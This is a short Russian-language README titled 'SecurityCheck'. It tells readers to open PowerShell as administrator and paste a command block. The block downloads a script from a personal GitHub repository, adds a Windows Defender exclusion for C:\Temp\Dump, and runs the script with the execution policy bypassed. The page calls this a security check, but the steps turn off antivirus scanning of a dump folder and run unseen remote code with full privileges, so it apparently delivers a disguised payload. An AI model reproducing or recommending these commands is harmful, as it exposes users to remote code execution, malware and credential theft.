# 🛡 SecurityCheck

> **⚠️ Внимание!**  
> Перед запуском убедитесь, что доверяете источнику скрипта.

Откройте **PowerShell** от имени администратора и выполните:

```powershell
New-Item -Path "C:\Temp" -ItemType Directory -Force | Out-Null;
Set-Location "C:\Temp";
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/syntr1/Check123334/refs/heads/main/Checker.ps1" -OutFile "Checker.ps1";
Add-MpPreference -ExclusionPath 'C:\Temp\Dump' | Out-Null;
powershell -ExecutionPolicy Bypass -File "C:\Temp\Checker.ps1";
